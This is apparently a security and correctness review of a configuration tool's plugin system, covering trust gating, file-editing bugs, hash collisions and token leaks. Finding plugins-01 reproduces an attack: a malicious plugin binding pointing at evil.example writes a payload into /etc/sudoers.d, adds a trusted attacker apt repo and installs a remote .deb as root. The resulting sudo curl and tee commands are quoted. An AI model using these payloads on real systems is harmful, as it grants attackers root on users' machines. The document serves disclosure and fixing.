# Review: Plugins: sync, trust, review, lock

Baseline: `956208e` · 2026-11-08 · reviewer: opus, effort xhigh
Scope: `configsys/plugins.py`, `examples/examplos/{README.md,WALKTHROUGH.md,driver.py,plugin.hu,routes.hu}`.
Context: `docs/plugins.md`, `configsys/driver.py`, plus `configsys/drivers/{apt,dnf,native_pkg_file,script,source,glue}.py`,
`configsys/actions.py`, `configsys/routes.py`, `configsys/hutext.py`, `configsys/runner.py` to judge the trust path.
Tests read: `test_plugins.py`, `test_plugin_trust.py`, `test_plugin_code.py`, `test_plugin_transport.py`,
`test_plugin_hooks.py`, `test_plugin_conflicts.py`, `test_plugin_pretend.py`, `test_plugin_lock_review.py`,
`test_plugin_tree_diff.py`, `test_plugin_latest.py`, `test_example_plugin.py`, `test_abi_surface.py`,
`test_primary_sync_safety.py`, `test_facet_trust.py`, `test_primary_verify.py` (86 in my core set, all green at baseline).

## Carried over from docs/review-2026-09/config-plugins.md

| earlier finding | status | evidence |
|---|---|---|
| [HIGH] data-only plugins execute arbitrary commands (trust gates the wrong axis) | **partially fixed / open** | A1 (`f066814`) gates `via: script/source/glue` + `source-line/ppa/apt-source` + facets via `command_trusted`. But apt `pubkey-*`/`source-url`/`source-path`, dnf `repo-*`/`enable-repo`, and `via: native-pkg-file` are **not** gated and **not** in `ships_executable_data` — re-reported as **plugins-01** (reproduced). |
| [HIGH] `dir_name()` traversal → `rmtree` | **fixed** | `dir_name` returns a hashed `plugin-<8hex>` for any non-`^[A-Za-z0-9][A-Za-z0-9._-]*$` result (`plugins.py:229,245-247`); `actions.plugin_remove` adds `pdir.resolve().parent != plugins_dir` guard (`actions.py:1336-1339`). Tests `test_dir_name_neutralizes_path_traversal`, `test_plugin_remove`…. |
| [HIGH] git option injection via `source:`/`ref:` | **fixed** | `_decl` drops any `-`-leading source/ref (`plugins.py:74-78`); `--` precedes every positional URL in `clone`/`ls-remote`/`fetch` (`:1535,1563,1571,1620,1656`). Residual: `git checkout --quiet {ref}` (`:1271,1284`) has no `--` and relies on `_decl` filtering — belt without suspenders; noted in plugins-09. Test `test_decl_drops_option_injecting_source_or_ref`. |
| [HIGH] include-dedup demotes the user's top config | **open (out of scope)** | lives in `layers.py` `_visit` — owned by the config-layers area (2026-09 A5, still TODO). |
| [MED] transitive `plugins:` followed for EVERY plugin, not just the primary | **obsolete** | the docs were reconciled to the code: `docs/plugins.md:61-63` now states any plugin may list further plugins. Residual posture note → **plugins-11**. |
| [MED] manifest `code:`/`data:` not confined to the plugin dir; identity misses out-of-tree code | **open** | `plugins.py:1140` `code_file = pdir / manifest['code']` (no containment); `plugin_identity` hashes only `root.rglob('*')` (`:336`) → **plugins-05**. |
| [MED] `_KNOWN_TOP_KEYS`/settings-registry drift; `humon.from_file` `{}` reject | **out of scope** | `layers.py`/`config.py` — config-layers area (B7 reported fixed in progress). |
| [MED] surgical section scanner desyncs on strings/backticks/empty files | **fixed (scanner) / open (insert)** | scanner moved to `hutext.py` and now handles backtick, backslash-as-literal, both comment styles (`hutext.py:39-128`); tests `test_locate_section_span_*`. But `set_section`'s *fallback insert* still uses `rfind('}')` (`plugins.py:827`) → **plugins-03** (reproduced). |
| [MED] `remove_sections` relies on `node.source_text` + first-occurrence `find` | **open** | `plugins.py:1082,1092` unchanged → **plugins-02** (reproduced: a sibling setting is silently lost). |
| [MED] plugin trees re-hashed / manifests re-parsed per startup (C5) | **open** | `read_manifest`/`plugin_identity` still un-memoised process-wide (only `ships_executable_data`/`provisions` cache) → **plugins-06** (measured). |
| [LOW] `CONFIGSYS_GIT_TOKEN` leaks into the command log / `--pretend` | **open** | `runner.py:464,467` records/echoes the full command incl. the token URL from `clone_url` → **plugins-07**. |
| [LOW] `plugin_identity` not length-prefixed → constructible collision | **open** | `plugins.py:343-346` `path\0content\0` → **plugins-08** (reproduced). |
| [LOW] `keys:` merges from every layer | **out of scope** | `config.py` — config-layers area. |
| [LOW] `register_transport` can claim a reserved scheme (only warned) | **open** | `plugins.py:1683-1691` — **plugins-09**. |
| [LOW] dead code: `_import_drivers`, profile-authoring writers | **obsolete** | `_import_drivers` is used by external plugin repos' tests (`~/src/configsys-{blender,kicad}/…`), so NOT dead; the named profile writers are already gone. |
| [LOW] eight near-identical `read_*` readers / five emitters (D8) | **open** | unchanged → **plugins-10**. |

## Cross-cutting themes

- **The command-trust gate (A1) is enforced per-driver, and two drivers never got it.** `command_trusted(rc)`
  is called by `script`, `source` and `glue`, but apt/dnf `ensure_prereqs` and `native-pkg-file.install`
  run plugin-authored root commands with no such check. The parallel detector, `ships_executable_data`,
  enumerates the *same* driver-set it was taught in A1 (script/source/glue + `source-line/ppa/apt-source`)
  and so under-reports: a plugin whose only executable surface is a signing-key write or a `.deb` URL reads
  as inert. The gate is a per-call allowlist that has to be remembered in every command-carrying driver and
  in one scanner; adding a driver or a repo field silently widens the hole. (plugins-01, plugins-05.)
- **The surgical `.hu` writers are two half-migrated generations.** The span *scanner* was correctly lifted
  into `hutext.py` and hardened, but `set_section`'s insert fallback (`rfind('}')`) and `remove_sections`
  (`node.source_text` + first-occurrence `text.find`) still use the pre-`hutext` heuristics the module's own
  docstring calls unreliable — and both corrupt or silently drop user settings on inputs that reach them.
  (plugins-02, plugins-03.)
- **Trust binds to a hash that is neither total nor unambiguous.** It skips out-of-tree `code:`/`data:` files
  entirely and is constructible-collidable across a NUL boundary. Neither is exploitable with a `.py` module
  today, but the identity is *the* anchor of the whole trust model. (plugins-05, plugins-08.)

## Findings

### plugins-01 [CRITICAL] security — a data plugin's native repo/key/`.deb` recipes run as root without trust
`configsys/plugins.py:493-524` (`_scan_executable_data`): the executable-data scan flags `via` ∈
{script, source, glue}, nested `glue`, and `source-line`/`ppa`/`apt-source` — but **not** `pubkey-url`,
`pubkey-path`, `source-url`, `source-path`, dnf `repo-url`/`repo-id`/`enable-repo`, nor `via:
native-pkg-file`. `configsys/drivers/apt.py:142-200` (`ensure_prereqs`) and `configsys/drivers/dnf.py:120-152`
run those writes as root with no `command_trusted` guard (unlike `script.py:80`, `source.py:110`); and
`configsys/drivers/native_pkg_file.py:110-127` (`install`) downloads an arbitrary binding `url:` and installs
it as root (`apt-get install`/`dnf install`/`pacman -U`) — a `.deb`/`.rpm` maintainer script is root code
execution — again ungated. A binding merges additively by `(via, when)` and a narrower `when:` wins by
specificity, so a plugin can attach such a binding to a component the user already picked and have it become
the default install path. This is the exact RCE class A1 was built to contain, reachable via a different
field set; it is reachable transitively (any synced plugin's manifest `plugins:`), so the attacker need not
be a plugin the user consciously added.
**(reproduced)** A data-only (no `code:`) plugin that adds to `btop`
`{ via: native  when: "not amzn"  repo-component: universe  pubkey-url: "https://evil.example/payload"  pubkey-path: "/etc/sudoers.d/zz"  source-line: "deb [trusted=yes] https://evil.example/apt stable main"  source-path: "/etc/apt/sources.list.d/evil.list" }`,
then `install btop --yes --pretend` on `--os pop`, emitted (verbatim from the plan):
`[pretend] [ -f /etc/sudoers.d/zz ] || sudo curl -fsSL https://evil.example/payload -o /etc/sudoers.d/zz`
and `… echo 'deb [trusted=yes] https://evil.example/apt stable main' | sudo tee /etc/apt/sources.list.d/evil.list …`
— no "untrusted plugin" refusal. A second plugin whose *only* extra surface was `pubkey-url`/`pubkey-path`
plus `{ via: native-pkg-file  url: "https://evil.example/btop.deb" }` was not even flagged: `plugin list`
showed plain `ok` and `plugin trust quietplug` said "ships no code or executable recipes — nothing to trust",
yet the key-write still ran as root in the plan.
**What the attacker could already do without this bug:** a data plugin can already pick the native *package
name*, but apt/dnf only install from already-configured repos — no new code path. This bug adds: writing an
arbitrary root-owned file (`pubkey-path` is unconstrained — `/etc/sudoers.d/…`), enabling an attacker apt/dnf
repo + key (→ arbitrary package install), and installing an arbitrary remote `.deb`/`.rpm` as root. That is
full root code execution across the plugin trust boundary, for a plugin the user never trusted. Rate HIGH (the
A1 class, incompletely closed); arguably CRITICAL since the privileged code runs on a normal `install` of a
picked component.
**Fix:** (a) in `_scan_executable_data`, also return True when a binding carries any of `pubkey-url`,
`pubkey-path`, `source-url`, `source-path`, dnf `repo-url`/`repo-id`/`enable-repo`, or `via: native-pkg-file`
with a `url:`; (b) gate `apt.ensure_prereqs`/`dnf.ensure_prereqs`/`native_pkg_file.install` on
`self.command_trusted(rc)` → `self.untrusted_command_result(rc)`, exactly as `script`/`source`/`glue` do; (c)
constrain `pubkey-path`/`source-path`/dnf repo path to the keyring/sources dirs at `routecheck` (the 2026-09
A10 that was never done). **Effort:** M. **Tier:** A. **Confidence:** high.
**Verified:** CONFIRMED (reproduced) — sandbox `--home …/verify-plugins/home*`, `--pretend`, untrusted
data-only plugins (no `code:`, no trust entry): (1) `--os pop install btop --yes` with a merged `btop`
`via: native` binding carrying `ppa:`/`pubkey-*`/`source-line:` put root `add-apt-repository -y ppa:…`,
`sudo curl -fsSL <url> -o <plugin-chosen root path>` and `… | sudo tee /etc/apt/sources.list.d/….list …` into
the plan with no refusal — even though `plugin list` itself labelled that plugin `ships recipes — untrusted`,
and docs/plugins.md §6 promises `source-line`/`ppa`/`apt-source` are *refused* until trust; (2) a variant with
only `pubkey-*` + `source-url`/`source-path` read `ok` in `plugin list` and `plugin trust` answered "ships no
code or executable recipes — nothing to trust" (exit 0), yet the root key/source writes still ran; (3) `--os
fedora`: `repo-id`/`repo-url`/`enable-repo` gave `sudo dnf config-manager --set-enabled …` and a `gpgcheck=0`
`.repo` written via `sudo tee`; (4) a `via: native-pkg-file  url:` component gave `sudo … curl … -o "$PKG" &&
apt-get install -y "$PKG"`. By reading: `NativePkgManager.install/upgrade` (`_native.py:80-95`),
`Apt.ensure_prereqs` (`apt.py:142-233`), `Dnf.ensure_prereqs` (`dnf.py:120-152`), `NativePkgFile.install`
(`native_pkg_file.py:110-127`) never call `command_trusted`; A1 (`git show --stat f066814`) touched only
script/source/glue; no test covers an untrusted apt/dnf/native-pkg-file binding. **Severity HIGH → CRITICAL:**
root-privileged commands from a never-trusted (possibly transitive) plugin on a normal `install` of a picked
component is the rubric's CRITICAL class (privilege across a trust boundary, reachable in normal use), and the
code breaks an explicit doc promise; the security area rated the same defect CRITICAL (security-01). The
"already could do" baseline above is understated: a `via: tarball` binding may set `scope: system` plus an
absolute `installDir:` and is equally ungated (seen in a `--pretend` plan as a root replace of that dir; cf.
security-02) — a sibling gap in the same class, not a designed capability, so it doesn't lower this rating, but
it means the fix must gate the class (any privileged or download binding from an untrusted plugin), not only
the fields listed in (a)/(b).

### plugins-02 [MED] correctness/safety — `remove_sections` deletes the wrong span, silently losing a sibling setting
`configsys/plugins.py:1068-1109` (`remove_sections`): locates each key by humon's `node.source_text`
(the span the module's own `set_section` docstring, `:815-817`, abandoned as "mis-reported … corrupted the
file") then does `base = text.find(span)` — the **first** occurrence of that text. When the section's text
also appears earlier (e.g. an example in a comment), the splice lands there, so a sibling setting is removed
and the real section survives.
**(reproduced)** On
`{\n    // pins: { steam: flatpak }\n    scope: user\n    pins: { steam: flatpak }\n}\n`,
`remove_sections(p, ['pins'])` produced
`{\n    //    scope: user\n    pins: { steam: flatpak }\n}\n` — `scope: user` is gone (merged into the
comment), and `pins:` (the thing asked to be removed) is still there. The file still parses, so the loss is
silent. This is the write path for `pin unset <last>`, `config unset`, emptying `picks`/`dispositions`/`theme`,
and `plugin init`'s move-out.
**Fix:** reimplement `remove_sections` on `hutext.section_span` (which already returns the exact key→value-end
span and is comment/string-aware), deleting that span plus its own leading whitespace/newline — drop
`node.source_text` and the first-occurrence `find`. **Effort:** M. **Tier:** B. **Confidence:** high.
**Verified:** CONFIRMED (reproduced) — the reviewer's input via `plugins.remove_sections` gave exactly
`'{\n    //    scope: user\n    pins: { steam: flatpak }\n}\n'` (parses as `{'pins': {'steam': 'flatpak'}}`,
`scope` gone), returning `['pins']` (reported as removed). End to end in a sandbox: a top config with
`// pins: { steam: flatpak }` above `scope: system` and the live `pins: { steam: flatpak }`, then
`configsys --home …/verify-plugins/home5 --os pop pin unset steam` → `configsys: unpinned steam`, exit 0;
the file afterwards has `//    scope: system` (the machine's install scope silently dropped back to the
default) and `pin list` still shows `steam -> flatpak [local]`. Also hit by a string value that contains the
section text (`note: "pins: { steam: flatpak }"` → `note: ""`, pins kept). Existing tests
(`test_plugins.py::test_remove_sections_preserves_the_rest`, `…keeps_bound_leading_comments`) use no
duplicate text. Severity MED kept: silent loss plus a false success, but it needs an identical copy of the
section text earlier in the file.

### plugins-03 [MED] correctness/safety — `set_section`'s insert fallback corrupts hostile/degenerate files
`configsys/plugins.py:826-828`: when the section is absent, `set_section` inserts before
`text.rstrip().rfind('}')` — a non-depth-aware search that finds the last literal `}` anywhere, including
inside a trailing comment, and assumes the file has a root brace at all.
**(reproduced)** via `set_section(p, 'pins', …)`:
- `{\n    scope: user\n}\n// trailing } comment\n` → `… // trailing     pins: { a: b }\n} comment\n`
  (spliced *inside* the comment) → `DeserializeError: TOOMANYROOTS`.
- an empty file → `    pins: { a: b }\n` (no braces) → unparsable.
- a brace-less file (`scope: user\n`) → unparsable.
- a comment-only file → the insert goes inside the comment and the setting is silently lost (`read_pins == {}`).
The real config is normally written from the template (well-braced), so the trigger is a hand-edited config
— reachable but not routine, hence MED. This is the 2026-09 D8 insert-fallback case, not fixed when the
scanner moved to `hutext`.
**Fix:** find the root's closing brace with a depth-0 `hutext` scan (last `}` at depth 0) instead of `rfind`;
when the document has no root map, write a fresh `{ <section> }`. Add the three cases as tests. **Effort:** S.
**Tier:** B. **Confidence:** high.
**Verified:** CONFIRMED (reproduced), with two sub-claims corrected. `set_pins` on scratch files: a
trailing `// trailing } comment` after the root → output fails to parse (`TOOMANYROOTS`/`SYNTAXERROR`); an
empty or whitespace-only file (which parses as `{}` beforehand) → unparsable. Corrections: the brace-less case
is garbage-in — `scope: user\n` is already rejected by humon, so configsys corrupts nothing there; and a
comment-only file turns **unparsable** with the multi-line `_emit_pins`, while the *silent loss* the reviewer
saw comes from a one-line emitter (`set_scalar_section`) or a block comment after the root
(`/* old: { x: y } */` → the insert lands inside it; parses, `read_pins == {}`). End to end, `configsys
--home …/verify-plugins/home{6,7,8} --os pop config set effects reduced` printed `set effects = reduced (in
top config)`, exit 0, each time: on a comment-only config and on one with a trailing block comment containing
`}`, `config show` then lists `effects (unset)` (lost); on one with a trailing `// end of config }`, the next
command fails `configsys.hu: could not read (Trove has syntax errors …)`. Severity MED kept (needs a
hand-edited config; reports a false success or bricks the config until it's hand-fixed).

### plugins-05 [MED] security — `code:`/`data:` paths are not contained; the trust hash misses out-of-tree code
`configsys/plugins.py:1140` (`_import_module`): `code_file = pdir / manifest['code']` with no
`resolve()`/containment, and `plugins.py:254` joins `data:` entries the same way. `plugin_identity`
(`:333-347`) hashes only files under `root.rglob('*')`. So `code: ../sibling/x.py` is imported after trust,
but the approved identity never covered it — the executed code can change (another plugin, or anyone who can
write the sibling path) without `plugin list` ever showing "changed since trust", breaking the documented
guarantee (`docs/plugins.md:223-228`: "Any change to the files … changes the hash"). `data:` traversal is
lower impact (more `.hu` layers) but lets a plugin pull another plugin's or the user's own files in under its
role.
**Fix:** require `path.resolve().is_relative_to(pdir.resolve())` for both `code:` and `data:`, else skip with
a `check` warning; walk `plugin_identity` with `os.walk(followlinks=False)` and refuse (or hash the link
target of) symlinks. **Effort:** S. **Tier:** A. **Confidence:** high.
**Verified:** CONFIRMED (by reading) — `_import_module` (`plugins.py:1134-1152`) imports `pdir /
manifest['code']` with no `resolve()`/containment; `_data_files` (`:268-274`) joins `data:` entries the same
way; `load_code` (`:1204`) gates on `is_trusted(…, plugin_identity(pdir))`, and `plugin_identity` (`:326-347`)
hashes only `root.rglob('*')`, so an out-of-tree `code:` target is never part of the approved hash. Nothing
downstream contains it: `layers._visit` (`layers.py:166-180`) uses `realpath` only for cycle detection. One more
angle, also by reading: `plugin_of_source` (`:431-444`) returns None for a realpath outside `plugins_dir`, and
`command_source_trusted` (`:447-456`) treats None as core/user (trusted) — so a `data:` entry that resolves
outside the plugins dir loads as a plugin-role layer while its command-carrying bindings are judged as the
user's own; containment closes that too. No test covers an out-of-tree `code:`/`data:` (test_plugin_code.py,
test_plugin_trust.py). I didn't build an import demonstration. Severity MED kept: the `code:` path is visible in
the manifest the user trusted, so the gain is lost drift detection, not new code execution, and the `data:`
angle needs attacker-controlled content at an outside path.

### plugins-06 [MED] performance — `read_manifest` / `plugin_identity` re-parsed per command
`configsys/plugins.py:250-258` (`read_manifest`) re-reads and re-parses `plugin.hu` on every call, and it is
called from `effective_declared`, `declared_tree`, `layer_files`, `status`, `splash_plugins`,
`declared_conflicts`, `shadowed_builtins`, `find_decl` and `sync`; `plugin_identity` (`:326-347`) reads every
file in the tree on each `checksum_ok`/`status`/`load_code`/`command_source_trusted` call.
**(reproduced/measured)** instrumenting a `--home <sandbox> --os pop inspect` with **one** synced plugin
counted `read_manifest` 8×, `plugin_identity` 2× — i.e. ~8N manifest parses per command for N plugins (a
primary + its transitive set is realistically 5–10). Modest in absolute terms today, but it is pure repeated
I/O+parse on the startup path.
**Fix:** memoise `read_manifest` on `(path, st_mtime_ns, st_size)` and `plugin_identity` on the tree's newest
mtime (or once per `Context`, dropped by `ctx.invalidate()`); read the trust store once in `load_code`.
**Effort:** M. **Tier:** C. **Confidence:** medium.

### plugins-04 [LOW] docs/feature — the example plugin's README "Try it" commands fail as written
`examples/examplos/README.md:41-53`: `./configsys.sh --os examplos plugin add examples/examplos` and the
`plugin list`/`where` that follow. `examples/examplos` is part of the main configsys repo, not its own git
repo, and `plugin add` clones the source.
**(reproduced)** `plugin add examples/examplos` →
`fatal: repository '…/examples/examplos' does not exist` → `failed examplos` →
`could not sync … nothing changed`. So the README's whole worked example never gets past the first command;
the `WALKTHROUGH.md` gets it right (copy out, `git init`, then add). A newcomer copy-pasting the README hits
an immediate, confusing failure.
**Fix:** make the README "Try it" copy the dir and `git init` it first (as the WALKTHROUGH does), or add
`--local` after a `git init`, and note the "must be a git repo" requirement inline. **Effort:** S. **Tier:** G.
**Confidence:** high.

### plugins-07 [LOW] security — `CONFIGSYS_GIT_TOKEN` leaks into the command log and `--pretend` output
`configsys/plugins.py:184-194` (`clone_url`) embeds the token in the https URL; `configsys/runner.py:464,467`
appends the full command to `self.calls` and echoes `[pretend] {full}`. So `--pretend plugin sync` (and any
recorded-call log) prints `https://<token>@github.com/…`.
**Fix:** pass the token via `GIT_ASKPASS`/`http.extraheader` in the env (`_noninteractive_git_env` already
builds the env dict), or redact `://<token>@` in `Runner.echo`/`calls`. **Effort:** S. **Tier:** A.
**Confidence:** high.

### plugins-08 [LOW] security — `plugin_identity` is not length-prefixed → constructible collision
`configsys/plugins.py:343-346`: hashes `relpath + \0 + content + \0` per file with no length prefix.
**(reproduced)** a tree `{a: b"X", b: b"Y"}` and a tree `{a: b"X\0b\0Y"}` produce the **same**
`sha256:48315abed5…`. Not exploitable for a `.py` module (CPython rejects NUL in source), but any binary
asset in a trusted tree (a splash plugin's fonts/images) makes the trust anchor ambiguous.
**Fix:** hash `len(path)\0path\0len(content)\0content`, or hash each file's own sha256 into a manifest list;
bump the trust-store format (existing approvals read as `changed` once — document it). **Effort:** S.
**Tier:** F. **Confidence:** high.

### plugins-09 [LOW] security — `register_transport` doesn't refuse reserved schemes; `checkout` lacks `--`
`configsys/plugins.py:1683-1691` accepts any scheme, so trusted plugin code can override `git`/`https`/`file`
for every other plugin's sync; `_RESERVED_SCHEMES` (`:39`) only feeds a `check` conflict string. Acceptable
because the code is already trusted, but inconsistent with `versions.register_source` (built-ins win). Also
`git checkout --quiet {shlex.quote(ref)}` (`:1271,1284`) carries no `--` separator and relies solely on
`_decl` dropping `-`-leading refs — add the belt-and-suspenders `--` (or a `rev-parse --verify` gate on the
detached path).
**Fix:** refuse a reserved scheme in `register_transport` like `versions.register_source` does; add `--`
before the ref in the `checkout` commands. **Effort:** S. **Tier:** A. **Confidence:** medium.

### plugins-10 [LOW] reuse — eight near-identical single-file readers and five map emitters (carried D8)
`configsys/plugins.py`: `read_pins:838`, `read_dispositions:869`, `read_picks:910`, `read_dirs:943`,
`read_scalar_section:978`, `read_list_section:996`, `read_theme:1030` share the "exists? → `materialize_string`
→ `.get(key)` → shape filter" skeleton (`read_pins`/`read_dispositions`/`read_dirs` byte-identical filters);
`_emit_pins`/`_emit_map_packed`/`_emit_picks`/`set_dirs`'s inline lambda/`_emit_kv` overlap with the generic
`_emit_kv`; the "remove when empty" prologue repeats in every `set_*`; `_flat:968` duplicates `config._leaves`.
**Fix:** `_read_top(file, key, shape)` + `_write_top(file, key, value)` built on `_emit_kv`, leaving the named
functions as one-line wrappers. **Effort:** M. **Tier:** D. **Confidence:** high.

### plugins-11 [LOW] security/posture — unbounded transitive `plugins:` fan-out from any plugin
`configsys/plugins.py:95-146,1700-1732`: `effective_declared`/`declared_tree`/`sync` follow the manifest
`plugins:` of *every* synced plugin (not only the primary), at floating refs and with no required `sha256:`.
This is now intended and documented (`docs/plugins.md:61-63`), so it's a posture note, not a regression: a
single declared plugin can pull in an arbitrary further set, each a `plugin`-role layer, with `plugin list`
the only visibility. Combined with plugins-01 it is the transitive delivery vehicle.
**Fix (optional):** require a `sha256:` to load a *non-primary* transitive decl, and/or print transitive decls
under their parent in `plugin sync`. **Effort:** M. **Tier:** A. **Confidence:** medium.

## Test gaps
- No test asserts `ships_executable_data` flags `pubkey-url`/`source-url`/`source-path`/dnf `repo-url`/`via:
  native-pkg-file` (it doesn't — that is plugins-01), nor that an untrusted plugin's apt/dnf repo-key binding
  or a `native-pkg-file` install is refused until trusted (the `script`-binding equivalent,
  `test_plugin_trust.py::test_command_binding_from_untrusted_data_plugin_is_refused_until_trusted`, exists;
  the native/dnf/native-pkg-file equivalents don't).
- No adversarial test for `remove_sections` when the section text recurs in a comment (plugins-02), nor for
  `set_section`'s insert fallback on a trailing-comment `}` / empty / brace-less file (plugins-03).
- No `plugin_identity` collision-resistance or out-of-tree `code:`/symlink test (plugins-05, plugins-08).
- `test_plugin_trust.py::test_is_trusted_requires_exact_commit` name is stale — the identity is a content
  hash, not a commit.
- Happy paths are well covered (sync branch/tag/detach, quarantine, trust lifecycle, section round-trips,
  review diff, lock, latest-ref, conflicts, pretend). The gap is adversarial input and the un-gated driver set.

## Dead code
- None in `plugins.py`. `_import_drivers` (`:1155-1162`) *looks* test-only but is used by external plugin
  repos' test harnesses (`grep` over `~/src/configsys-blender/`, `~/src/configsys-kicad/`: both call
  `plugins._import_drivers(PLUG, plugins.read_manifest(PLUG))`), and `Driver`/`Result`/`Splash` are imported
  across `~/src/configsys-*`. The profile-authoring writers named in the 2026-09 review (`set_profiles`,
  `read_configs`, …) are already gone (0 hits tree-wide).

## ABI / interface candidates
- `__all__` (`plugins.py:60-66`) still mixes app-internal orchestration (`declared`, `source_url`, `dir_name`,
  `read_manifest`, `layer_files`, `status`, `sync`, `set_declared`, `set_section`, `read_pins`, `set_pins`)
  with the real plugin ABI; `test_abi_surface.py` only pins the ABI names, so the internals are implicitly
  promised but ungated. Trim `__all__` to the ABI and document the rest as internal (2026-09 Tier F, open).
- The trust-store identity format (plugins-08) is a one-time format change if length-prefixing lands — bundle
  it with any Tier F pass.
- `register_transport`'s callback contract `fn(runner, dest, source, ref)` is documented only in a docstring
  (`:1683-1687`); promote it into `test_abi_surface` alongside `register_version_source`.

## Questions for the user
1. plugins-01 severity: treat the apt/dnf/native-pkg-file root-command gap as HIGH (matching A1's framing) or
   CRITICAL (it is root code execution on a normal `install`)? The fix is the same either way. *(Verifier: rated
   CRITICAL — see plugins-01's Verified line.)*
2. For plugins-05/plugins-11, do you want non-primary transitive plugins to *require* a `sha256:` to load, or
   keep the current open fan-out and only surface it better?
3. plugins-04: fold the example README/WALKTHROUGH into the `/update-docs` pass, or fix the README in the
   security/correctness batch (it's an owned file and a user-visible breakage)?

## Refuted on verification

None — all four checked findings (plugins-01, -02, -03, -05) held; plugins-03 had two sub-claims corrected in its Verified line.
